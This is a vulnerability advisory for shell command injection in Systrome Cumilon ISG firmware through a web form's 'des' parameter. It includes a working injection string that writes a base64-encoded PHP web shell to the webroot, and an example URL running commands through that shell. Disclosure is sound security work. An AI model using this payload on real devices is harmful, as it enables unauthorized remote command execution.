Description:
============
An issue was discovered on Systrome Cumilon ISG-600C, ISG-600H, and ISG-800W devices with firmware
V1.1-R2.1_TRUNK-20181105.bin.
A shell command injection occurs by editing the description of an ISP file. The file network/isp/isp_update_edit.php
does not properly validate user input, which leads to shell command injection via the des parameter.

[Additional_information]

The php file ./network/isp/isp_update_edit.php dose not properly validate the user input which leads to to shell
command injection.
below is the vulnerable code snipet  "<td><input name="des" id="des" value="<?php echo $item['des'];?>" type="text"
<?php echo $item['des'];?> size="50" maxlength="<?php echo XML_MAX_DESC_LEN;?>"/><"

[VulnerabilityType Other]
Authenticated Shell Command Injection

[Affected Component]
The php file ./network/isp/isp_update_edit.php dose not properly validate the user input which leads to to shell
command injection.
below is the vulnerable code snippet  "<td><input name="des" id="des" value="<?php echo $item['des'];?>" type="text" <?

[Attack Type]
Local

[Impact Code execution]
true

[Attack Vectors]

visit the url <http://device_ip/network/isp/isp_update_edit.php?pv=ISP_INTL.dat>
adding the strings below will add a php system command shell in the webroot of the device:
'`echo PD9waHAKJGNtZD0kX0dFVFsnY21kJ107CnN5c3RlbSgkY21kKTsKPz4KCg== | base64 -d > /usr/local/wwwroot/cmd.php`'

the php system shell can then be accessed via browser, e.g: <http://device_ip/cmd.php?cmd=ifconfig>

Mitigation
